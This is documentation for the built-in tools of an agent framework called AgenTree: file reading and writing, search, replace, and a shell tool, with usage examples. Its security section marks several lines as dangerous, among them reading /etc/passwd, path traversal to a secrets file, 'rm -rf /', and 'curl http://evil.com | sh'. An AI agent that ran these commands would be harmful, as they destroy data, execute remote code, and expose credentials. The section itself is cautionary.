# Built-in Tools

## Overview

AgenTree provides a comprehensive set of built-in tools for common operations. These tools are categorized into core tools (always available) and default tools (import to use).

## Core Tools

These tools are automatically available to all agents and handle agent lifecycle management.

### createAgent

Creates a child agent for subtask decomposition.

```typescript
interface CreateAgentParams {
  name: string;               // Child agent name
  task: string;               // Task description for child
  context?: string[];         // Context to pass to child
  tools?: string[];           // Tool names child should have access to
}
```

**Usage by LLM:**
```json
{
  "name": "createAgent",
  "arguments": {
    "name": "data-analyzer",
    "task": "Analyze the CSV data and identify trends and outliers",
    "context": [
      "./data/sales-data.csv",
      "Focus on quarterly trends and seasonal patterns"
    ],
    "tools": ["readFile", "calculateStats"]
  }
}
```

**Behavior:**
- Only available when `depth < maxDepth`
- Child inherits parent's configuration
- Tools are resolved from ToolRegistry
- Context is loaded for child agent
- Parent waits for child completion

**Returns:** String describing child agent creation and execution result

### stopAgent

Completes agent execution and returns final results.

```typescript
interface StopAgentParams {
  result: string;             // Final result to return
  success?: boolean;          // Whether task completed successfully (default: true)
}
```

**Usage by LLM:**
```json
{
  "name": "stopAgent", 
  "arguments": {
    "result": "Analysis complete. Found 3 key trends: revenue growth of 23%, customer acquisition increase of 15%, and seasonal spike in Q4.",
    "success": true
  }
}
```

**Behavior:**
- Marks agent as completed
- Sets final result for parent
- Triggers completion events
- Stops execution loop

**Returns:** Confirmation message (execution stops after this)

## Default Tools

Import these tools to use common file and system operations.

### Import Syntax

```typescript
// Individual imports
import { readFileTool, writeFileTool, searchTool } from 'agentree';

const agent = new Agent({
  tools: [readFileTool, writeFileTool, searchTool]
});

// Import all default tools
import { defaultTools } from 'agentree';

const agent = new Agent({
  tools: defaultTools  // All default tools included
});
```

### readFile

Read content from files with automatic encoding detection.

```typescript
interface ReadFileParams {
  path: string;               // File path to read
}
```

**Example Usage:**
```json
{
  "name": "readFile",
  "arguments": {
    "path": "./data/config.json"
  }
}
```

**Features:**
- Supports any UTF-8 encoded text file
- Automatic path resolution
- File existence validation
- Clear error messages for common issues

**Returns:** File content as string

**Error Handling:**
- File not found: Clear message with path
- Permission denied: Explains access issue
- Invalid encoding: Suggests file type issue

### writeFile

Create or overwrite files with content.

```typescript
interface WriteFileParams {
  path: string;               // File path to create/write
  content: string;            // Content to write
  overwrite?: boolean;        // Allow overwriting existing files (default: false)
}
```

**Example Usage:**
```json
{
  "name": "writeFile",
  "arguments": {
    "path": "./output/report.md",
    "content": "# Analysis Report\n\nKey findings:\n- Revenue up 23%\n- New customers: 1,247",
    "overwrite": false
  }
}
```

**Features:**
- Automatic directory creation
- Overwrite protection by default
- File size reporting
- Path validation

**Returns:** Success message with file info (path, size)

**Error Handling:**
- File exists (when overwrite=false): Suggests using overwrite=true
- Permission denied: Explains directory/file permissions
- Invalid path: Path validation errors

### searchTool

Search for text patterns across multiple files with filtering.

```typescript
interface SearchToolParams {
  query: string;              // Text or regex pattern to search
  extensions?: string[];      // File extensions to include (e.g., ['.ts', '.js'])
  root?: string;              // Root directory to search (default: '.')
}
```

**Example Usage:**
```json
{
  "name": "searchTool",
  "arguments": {
    "query": "function calculateTotal",
    "extensions": [".ts", ".js"],
    "root": "./src"
  }
}
```

**Features:**
- Recursive directory traversal
- File extension filtering
- Regex pattern support
- Results with file paths and match counts

**Returns:** JSON array of matches with file paths and match counts

**Advanced Usage:**
```json
{
  "name": "searchTool",
  "arguments": {
    "query": "TODO:|FIXME:|BUG:",
    "extensions": [".ts", ".js", ".py"],
    "root": "./src"
  }
}
```

### replaceFile

Find and replace text in files with regex support.

```typescript
interface ReplaceFileParams {
  path: string;               // File path to modify
  search: string;             // Text or regex pattern to find
  replace: string;            // Replacement text
  useRegex?: boolean;         // Treat search as regex (default: false)
}
```

**Example Usage:**
```json
{
  "name": "replaceFile",
  "arguments": {
    "path": "./src/config.ts",
    "search": "version: '1.0.0'",
    "replace": "version: '1.1.0'",
    "useRegex": false
  }
}
```

**Regex Example:**
```json
{
  "name": "replaceFile", 
  "arguments": {
    "path": "./src/utils.ts",
    "search": "console\\.log\\([^)]*\\);?",
    "replace": "// Debug log removed",
    "useRegex": true
  }
}
```

**Features:**
- Simple text replacement
- Regex pattern replacement
- Global replacement (all occurrences)
- Backup file creation option
- Change count reporting

**Returns:** Confirmation with number of replacements made

### bash

Execute shell commands with timeout and error handling.

```typescript
interface BashParams {
  command: string;            // Shell command to execute
  timeout?: number;           // Timeout in milliseconds (default: 10000)
}
```

**Example Usage:**
```json
{
  "name": "bash",
  "arguments": {
    "command": "npm run build",
    "timeout": 30000
  }
}
```

**Common Use Cases:**
```json
// Git operations
{
  "name": "bash",
  "arguments": {
    "command": "git status --porcelain"
  }
}

// Package management
{
  "name": "bash",
  "arguments": {
    "command": "npm list --depth=0"
  }
}

// File operations
{
  "name": "bash",
  "arguments": {
    "command": "find ./src -name '*.ts' | wc -l"
  }
}

// System information
{
  "name": "bash",
  "arguments": {
    "command": "df -h"
  }
}
```

**Features:**
- Configurable timeout
- Stdout and stderr capture
- Exit code handling
- Command validation
- Safe execution environment

**Returns:** Command output (stdout + stderr)

**Security Note:** Commands run with current user permissions. Avoid using with untrusted input.

## Tool Usage Patterns

### File Processing Pipeline

```typescript
const fileProcessingAgent = new Agent({
  name: "file-processor",
  task: "Process all CSV files: clean data, analyze, and generate summary",
  tools: [readFileTool, writeFileTool, searchTool, replaceFileTool],
  config: { /* ... */ }
});

// Agent might use tools in sequence:
// 1. searchTool to find CSV files
// 2. readFile to load each CSV
// 3. replaceFile to clean data  
// 4. writeFile to save processed data
// 5. writeFile to create summary report
```

### Development Workflow

```typescript
const devAgent = new Agent({
  name: "development-assistant", 
  task: "Update version numbers, run tests, and commit changes",
  tools: [readFileTool, writeFileTool, replaceFileTool, bash],
  config: { /* ... */ }
});

// Agent workflow:
// 1. readFile package.json to get current version
// 2. replaceFile to update version in multiple files
// 3. bash to run tests
// 4. bash to commit changes if tests pass
```

### Data Analysis

```typescript
const dataAgent = new Agent({
  name: "data-analyst",
  task: "Analyze log files and generate insights report",
  tools: [readFileTool, searchTool, writeFileTool, bash],
  config: { /* ... */ }
});

// Analysis workflow:
// 1. searchTool to find log files
// 2. readFile to load logs
// 3. bash for advanced text processing (awk, grep)
// 4. writeFile to save analysis results
```

## Tool Security and Best Practices

### File System Safety

```typescript
// Good: Relative paths within project
readFile({ path: "./data/input.csv" })
writeFile({ path: "./output/results.json", content: data })

// Dangerous: Absolute paths or path traversal
readFile({ path: "/etc/passwd" })           // System files
writeFile({ path: "../../secrets.env" })   // Path traversal
```

### Command Safety

```typescript
// Good: Safe, specific commands
bash({ command: "npm test" })
bash({ command: "git status" })
bash({ command: "ls -la ./src" })

// Dangerous: User input or system modification
bash({ command: userInput })                    // Injection risk
bash({ command: "rm -rf /" })                  // Destructive
bash({ command: "curl http://evil.com | sh" }) // Remote execution
```

### Error Handling

All default tools include comprehensive error handling:

```typescript
// Example error responses
{
  "error": "File not found: ./missing.txt. Please check the file path."
}

{
  "error": "Permission denied: ./protected.log. Please check file permissions."
}

{
  "error": "Command failed with exit code 1: npm test. Error: Test suite failed."
}
```

## Extending Default Tools

### Custom Tool Based on Defaults

```typescript
import { readFileTool } from 'agentree';
import { tool } from 'agentree';
import { z } from 'zod';

const jsonReaderTool = tool({
  name: 'read_json',
  description: 'Read and parse JSON files with validation',
  parameters: z.object({
    path: z.string(),
    schema?: z.string().optional().describe('Expected JSON schema')
  }),
  async execute({ path, schema }) {
    // Use existing readFile tool
    const content = await readFileTool.execute({ path });
    
    try {
      const data = JSON.parse(content);
      
      if (schema) {
        // Validate against schema
        validateJsonSchema(data, schema);
      }
      
      return JSON.stringify(data, null, 2);
    } catch (error) {
      throw new Error(`Invalid JSON in ${path}: ${error.message}`);
    }
  }
});
```

### Enhanced File Operations

```typescript
const advancedFileTool = tool({
  name: 'advanced_file_ops',
  description: 'Advanced file operations with metadata',
  parameters: z.object({
    operation: z.enum(['stat', 'copy', 'move', 'list_detailed']),
    path: z.string(),
    destination: z.string().optional()
  }),
  async execute({ operation, path, destination }) {
    switch (operation) {
      case 'stat':
        const stats = await fs.stat(path);
        return JSON.stringify({
          size: stats.size,
          created: stats.birthtime,
          modified: stats.mtime,
          isDirectory: stats.isDirectory()
        }, null, 2);
        
      case 'copy':
        if (!destination) throw new Error('Destination required for copy');
        await fs.copyFile(path, destination);
        return `Copied ${path} to ${destination}`;
        
      case 'move':
        if (!destination) throw new Error('Destination required for move');
        await fs.rename(path, destination);
        return `Moved ${path} to ${destination}`;
        
      case 'list_detailed':
        const entries = await fs.readdir(path, { withFileTypes: true });
        const details = await Promise.all(
          entries.map(async entry => {
            const entryPath = path.join(path, entry.name);
            const stats = await fs.stat(entryPath);
            return {
              name: entry.name,
              type: entry.isDirectory() ? 'directory' : 'file',
              size: stats.size,
              modified: stats.mtime
            };
          })
        );
        return JSON.stringify(details, null, 2);
    }
  }
});
```

## Tool Registry Integration

### Checking Available Tools

```typescript
import { ToolRegistry } from 'agentree';

// List all registered tools
console.log('Available tools:', ToolRegistry.list());

// Check if specific tool is available
if (ToolRegistry.has('readFile')) {
  console.log('File reading is available');
}

// Get tool by name
const readTool = ToolRegistry.get('readFile');
if (readTool) {
  console.log('Tool description:', readTool.description);
}
```

### Manual Registration

```typescript
import { ToolRegistry, defaultTools } from 'agentree';

// Register all default tools globally
defaultTools.forEach(tool => {
  ToolRegistry.register(tool);
});

// Now child agents can access tools by name
const parentAgent = new Agent({
  name: "coordinator",
  task: "Create child agents that need file operations",
  // Child agents can now use tools: ["readFile", "writeFile"] in createAgent calls
});
```

## Performance Considerations

### File Size Limits

```typescript
// Good: Reasonable file sizes
readFile({ path: "./config.json" })      // ~1KB
readFile({ path: "./data/sample.csv" })  // ~1MB

// Be cautious with large files
readFile({ path: "./logs/huge.log" })    // Could be 100MB+
readFile({ path: "./data/dataset.csv" }) // Could be 1GB+
```

### Command Timeouts

```typescript
// Good: Appropriate timeouts
bash({ command: "npm test", timeout: 30000 })        // 30s for tests
bash({ command: "git clone repo", timeout: 60000 })  // 60s for clone

// Avoid: Very long timeouts
bash({ command: "slow-process", timeout: 300000 })   // 5 minutes may block agent
```

### Concurrent Operations

```typescript
// Tools are async and can be used concurrently by different agents
// Each agent executes tools independently
// No shared state between tool executions
```

## Troubleshooting

### Common Issues

#### File Not Found
```
Error: File not found: ./data.csv. Please check the file path.
```
**Solution:** Verify file exists and path is correct relative to working directory

#### Permission Denied
```
Error: Permission denied: ./protected.log. Please check file permissions.
```
**Solution:** Check file/directory permissions, ensure process has read/write access

#### Command Failed
```
Error: Command failed with exit code 1: npm test
```
**Solution:** Check command syntax, ensure dependencies installed, verify working directory

#### Large File Issues
```
Error: File too large to process efficiently
```
**Solution:** Use streaming for large files or process in chunks

## See Also

- [Tool Interface](/api/tool-interface) - Creating custom tools
- [Agent Class](/api/agent-class) - Using tools with agents
- [Examples - Custom Tools](/examples/custom-tools) - Advanced tool examples
- [Types Reference](/api/types-reference) - Complete type definitions